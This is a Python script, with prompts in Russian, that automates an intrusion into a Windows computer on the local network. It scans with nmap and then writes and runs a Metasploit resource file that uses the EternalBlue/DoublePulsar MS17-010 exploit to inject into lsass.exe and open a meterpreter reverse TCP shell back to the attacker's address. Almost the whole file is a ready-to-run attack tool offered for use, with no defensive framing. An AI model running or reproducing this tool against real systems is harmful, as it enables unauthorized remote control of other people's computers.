import os
import time

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'


try:
    os.system('hacking.rc')
    os.system('ip route')
    nac=input(color.DARKCYAN+'Впишите локальный адрес, чтобы получить информацию: '+color.END)
    os.system('nmap '+nac+' > hac.txt')
    file=open('hac.txt', 'r')
    print(file.read())
    time.sleep(15)
    file.close()
    os.system('rm hac.txt')
    time.sleep(5)
    print(color.RED+color.BOLD+'Локальный адрес компьютера который пробуем взломать'+color.END)
    hack=input('-> ')
    print(color.RED+color.BOLD+'Укажите архетектуру на которой работает windows'+color.END)
    print(color.RED+color.BOLD+'Пишите x64 или x32, x обязательно писать и на EN '+color.END)
    arhi=input('-> ')
    print(color.RED+color.BOLD+'Ваш локальный адрес...'+color.END)
    print(color.RED+color.BOLD+'Сразу первый ip твой'+color.END)
    os.system('ifconfig | grep inet | grep netmask | grep broadcast')
    lhost=input('-> ')
    f=open('hacking.rc', 'w')
    f.write('''
clear
use auxiliary/scanner/smb/smb_ms17_010
set rhost '''+hack+'''
run
sleep 10
hosts
vulns
sleep 3
use windows/smb/eternalblue_doublepulsar
set eternalbluepath Eternalblue/deps/
set doublepulsarpath Eternalblue/deps/
set targetarchitecture '''+arhi+'''
set processinject lsass.exe
set lhost '''+lhost+'''
set rhost '''+hack+'''
set payload windows/'''+arhi+'''/meterpreter/reverse_tcp
exploit
''')
    os.system('clear')
    print(color.RED+color.BOLD+'Запись закончина, приступаю к запуску...'+color.END)
    time.sleep(4)
    os.system('clear')
    os.system('msfconsole -r hacking.rc')
    
except:
    print(color.RED+'Выход...'+color.END)






























    #
